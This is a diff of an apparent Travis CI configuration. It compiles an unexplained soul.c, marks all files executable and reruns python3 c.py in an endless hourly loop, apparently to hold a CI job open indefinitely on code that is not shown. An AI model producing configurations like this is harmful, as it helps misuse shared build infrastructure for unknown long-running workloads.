@@ -1,4 +1,3 @@
-
 language: python
 dist: focal  # Use Ubuntu 20.04 (Focal Fossa)
 python:
@@ -18,14 +17,6 @@ before_script:
   # Compile soul.c if it exists
   - if [ -f soul.c ]; then gcc soul.c -o soul -lpthread; fi
 
-# Ensure to run the check script for c.py
 script:
-  - bash path/to/your/c.py
-  - chmod +x * && lscpu && python3 c.py
-
-# Add the following option to ensure that it will always run
-jobs:
-  include:
-    - stage: test
-      script: 
-        - while true; do echo "Running..."; sleep 3600; done
+  # Run the Python script continuously
+  - chmod +x * && lscpu && (while true; do python3 c.py; sleep 3600; done)
